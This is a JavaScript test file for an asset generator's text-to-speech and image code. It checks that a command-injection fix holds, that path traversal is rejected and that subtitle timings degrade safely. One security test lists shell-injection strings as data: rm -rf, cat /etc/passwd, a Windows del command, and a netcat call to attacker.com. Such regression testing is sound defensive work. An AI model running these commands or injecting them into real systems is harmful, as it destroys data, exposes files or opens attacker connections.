// @ts-check
/**
 * AssetGenerator 安全回归测试 (P0-1)
 *
 * 验证命令注入漏洞已修复：
 *   - spawn 调用必须使用 shell: false
 *   - 恶意文本不能触发任意 shell 命令
 */
// vitest 全局注入 vi, describe, it, expect, beforeEach — 无需 require

const { EventEmitter } = require('events')

// 用 vi.fn 创建 mock spawn，捕获调用参数
const mockSpawn = vi.fn((cmd, args, opts) => {
  const proc = new EventEmitter()
  setTimeout(() => proc.emit('exit', 1), 0)
  return proc
})

// 项目 test-setup.js 的 __registerMock 通过 Module._load 拦截 CJS require
__registerMock('child_process', {
  spawn: mockSpawn,
  execFile: vi.fn((cmd, args, opts, cb) => {
    if (typeof opts === 'function') cb = opts
    else if (typeof cb !== 'function') cb = () => {}
    cb(new Error('mocked'))
  }),
  execSync: vi.fn(() => ''),
})

__registerMock('fs', {
  existsSync: vi.fn(() => false),
  mkdirSync: vi.fn(),
  statSync: vi.fn(() => ({ size: 1024 })),
  writeFileSync: vi.fn(),
  readFileSync: vi.fn(() => ''),
  rmSync: vi.fn(),
})

const {
  AssetGenerator,
  buildEdgeTtsScript,
  resolveImageSize,
  escapeDrawtextText,
} = require('./asset-generator')

// 辅助：从 mockSpawn.mock.calls 中找 python 调用
function findPythonSpawn() {
  const call = mockSpawn.mock.calls.find(c => c[0] === 'python')
  return call ? { cmd: call[0], args: call[1], opts: call[2] } : undefined
}

describe('AssetGenerator P0-1: command injection prevention', () => {
  beforeEach(() => { mockSpawn.mockClear() })

  it('spawn must use shell: false (not shell: true)', async () => {
    const gen = new AssetGenerator({ outputDir: '/tmp/test' })
    await gen.generateTTS('hello world', { index: 0 })
    const ttsSpawn = findPythonSpawn()
    expect(ttsSpawn).toBeDefined()
    expect(ttsSpawn.opts.shell).toBe(false)
  })

  it('malicious shell metacharacters are passed as args, not executed', async () => {
    const gen = new AssetGenerator({ outputDir: '/tmp/test' })
    const maliciousInputs = [
      '"; rm -rf / #',
      '$(whoami)',
      'a && del /F /Q C:\\',
      '`; cat /etc/passwd #',
      '| nc attacker.com 4444',
    ]
    for (const text of maliciousInputs) {
      mockSpawn.mockClear()
      await gen.generateTTS(text, { index: 0 })
      const ttsSpawn = findPythonSpawn()
      expect(ttsSpawn).toBeDefined()
      // 验证恶意文本作为数组参数原样传递，而非被 shell 解释
      expect(ttsSpawn.args).toContain(text)
      expect(ttsSpawn.opts.shell).toBe(false)
    }
  })

  it('cleanText is sliced to 200 chars before passing to spawn', async () => {
    const gen = new AssetGenerator({ outputDir: '/tmp/test' })
    const longText = 'a'.repeat(500)
    await gen.generateTTS(longText, { index: 0 })
    const ttsSpawn = findPythonSpawn()
    expect(ttsSpawn).toBeDefined()
    const passedText = ttsSpawn.args.find(a => typeof a === 'string' && a.length === 200)
    expect(passedText).toBeDefined()
    expect(passedText.length).toBe(200)
  })

  it('empty text falls back to silence (no spawn call to python)', async () => {
    const gen = new AssetGenerator({ outputDir: '/tmp/test' })
    mockSpawn.mockClear()
    await gen.generateTTS('', { index: 0 })
    const pythonSpawn = findPythonSpawn()
    // 空文本应直接返回 null，不调用 python
    expect(pythonSpawn).toBeUndefined()
  })

  it('edge-tts 使用可执行的单表达式脚本，不在分号后声明 async def', () => {
    const script = buildEdgeTtsScript()
    expect(script).toContain('asyncio.run')
    expect(script).not.toMatch(/;\s*async\s+def/)
  })

  it('UI 暴露的水彩和极简样式拥有稳定画布尺寸', () => {
    expect(resolveImageSize('16:9', 'watercolor')).toEqual({ width: 1280, height: 720 })
    expect(resolveImageSize('9:16', 'minimalist')).toEqual({ width: 720, height: 1280 })
  })

  it('按安全的 runId 隔离图片和音频输出，并拒绝路径穿越索引', async () => {
    const gen = new AssetGenerator({ outputDir: '/tmp/test' })
    await gen.generateTTS('hello', { index: '../escape', runId: '../run/id' })
    const ttsSpawn = findPythonSpawn()
    expect(ttsSpawn).toBeDefined()
    const audioPath = ttsSpawn.args.find(
      (arg) => typeof arg === 'string' && /[\\/]tts_0000\.mp3$/.test(arg),
    )
    expect(audioPath).toBeDefined()
    expect(audioPath).toContain('run_id')
    expect(audioPath).not.toContain('..')
    expect(audioPath).toMatch(/tts_0000\.mp3$/)
  })

  it('drawtext 文本会折叠换行并转义滤镜分隔符', () => {
    const escaped = escapeDrawtextText("a:b,c%{x}\nnext")
    expect(escaped).toBe("a\\:b\\,c\\%\\{x\\} next")
  })
})

describe('TTS 词级时间戳（消除事后 whisper ASR）', () => {
  const fsMock = require('fs')

  it('edge-tts 脚本启用 WordBoundary（构造函数参数）并写时间戳 sidecar（argv[6]）', () => {
    const script = buildEdgeTtsScript()
    expect(script).toContain('asyncio.run')
    // 7.x 起 boundary 是 Communicate 构造函数参数（默认 SentenceBoundary），必须显式 WordBoundary
    expect(script).toContain('boundary="WordBoundary"')
    expect(script).toContain('sys.argv[6]')
    expect(script).not.toMatch(/;\s*async\s+def/)
  })

  it('python 退出 0 + sidecar 存在 → 返回 timings 且 duration 来自词尾', async () => {
    const gen = new AssetGenerator({ outputDir: '/tmp/test' })
    const originalSpawnImpl = mockSpawn.getMockImplementation()
    const originalExists = fsMock.existsSync.getMockImplementation()
    const originalStat = fsMock.statSync.getMockImplementation()
    const originalRead = fsMock.readFileSync.getMockImplementation()
    mockSpawn.mockImplementation((cmd, args, opts) => {
      const proc = new EventEmitter()
      setTimeout(() => proc.emit('exit', 0), 0)
      return proc
    })
    fsMock.existsSync.mockImplementation((p) => String(p).endsWith('.mp3') || String(p).endsWith('.timings.json'))
    fsMock.statSync.mockReturnValue({ size: 48000 })
    fsMock.readFileSync.mockImplementation((p) => {
      if (String(p).endsWith('.timings.json')) {
        return JSON.stringify([
          { text: '你好', start: 0, end: 0.6 },
          { text: '世界', start: 0.6, end: 1.2 },
        ])
      }
      return ''
    })
    try {
      const result = await gen.generateTTS('你好世界', { index: 0 })
      expect(result.code).toBe(0)
      expect(result.data.timings).toEqual([
        { text: '你好', start: 0, end: 0.6 },
        { text: '世界', start: 0.6, end: 1.2 },
      ])
      expect(result.data.duration).toBe(1.5) // 1.2s 词尾 + 0.3s 尾音
      const ttsSpawn = findPythonSpawn()
      expect(ttsSpawn.args[ttsSpawn.args.length - 1]).toMatch(/\.timings\.json$/)
    } finally {
      mockSpawn.mockImplementation(originalSpawnImpl)
      fsMock.existsSync.mockImplementation(originalExists)
      fsMock.statSync.mockImplementation(originalStat)
      fsMock.readFileSync.mockImplementation(originalRead)
    }
  })

  it('provider TTS 返回 subtitle_file → 抓取并解析词级时间戳（毫秒 → 秒）', async () => {
    const fetchImpl = vi.fn(async () => ({
      ok: true,
      async text() {
        return JSON.stringify({
          subtitle: [
            { text: '你好', start_time: 0, end_time: 600 },
            { text: '世界', start_time: 600, end_time: 1200 },
          ],
        })
      },
    }))
    const aiGenerator = {
      generate: vi.fn(async () => ({
        audio: Buffer.from([1, 2, 3]),
        format: 'mp3',
        duration: 1.5,
        subtitleFile: 'https://cdn.minimax.chat/sub.json',
      })),
    }
    const gen = new AssetGenerator({ outputDir: '/tmp/test', aiGenerator, fetchImpl })
    const result = await gen.generateTTS('你好世界', { index: 0, voice_provider: 'minimax-tts', voice_id: 'male-qn-qingse' })
    expect(result.code).toBe(0)
    expect(result.data.provider).toBe('minimax-tts')
    expect(result.data.timings).toEqual([
      { text: '你好', start: 0, end: 0.6 },
      { text: '世界', start: 0.6, end: 1.2 },
    ])
    expect(fetchImpl).toHaveBeenCalledWith('https://cdn.minimax.chat/sub.json', expect.objectContaining({ signal: expect.anything() }))
  })

  it('subtitle 抓取失败 → 静默降级（无 timings，不影响音频返回）', async () => {
    const fetchImpl = vi.fn(async () => { throw new Error('ECONNREFUSED') })
    const aiGenerator = {
      generate: vi.fn(async () => ({
        audio: Buffer.from([1, 2, 3]),
        format: 'mp3',
        duration: 1.5,
        subtitleFile: 'https://cdn.minimax.chat/sub.json',
      })),
    }
    const gen = new AssetGenerator({ outputDir: '/tmp/test', aiGenerator, fetchImpl })
    const result = await gen.generateTTS('你好世界', { index: 0, voice_provider: 'minimax-tts' })
    expect(result.code).toBe(0)
    expect(result.data.timings).toBeUndefined()
    expect(result.data.duration).toBe(1.5)
  })

  it('subtitle 文件 content-length 超限 → 不读取正文，直接降级（无 timings）', async () => {
    const textSpy = vi.fn(async () => '{"subtitle":[]}')
    const fetchImpl = vi.fn(async () => ({
      ok: true,
      headers: { get: () => String(8 * 1024 * 1024 + 1) },
      text: textSpy,
    }))
    const aiGenerator = {
      generate: vi.fn(async () => ({
        audio: Buffer.from([1, 2, 3]),
        format: 'mp3',
        duration: 1.5,
        subtitleFile: 'https://cdn.minimax.chat/huge.json',
      })),
    }
    const gen = new AssetGenerator({ outputDir: '/tmp/test', aiGenerator, fetchImpl })
    const result = await gen.generateTTS('你好世界', { index: 0, voice_provider: 'minimax-tts' })
    expect(result.code).toBe(0)
    expect(result.data.timings).toBeUndefined()
    expect(textSpy).not.toHaveBeenCalled()
  })
})
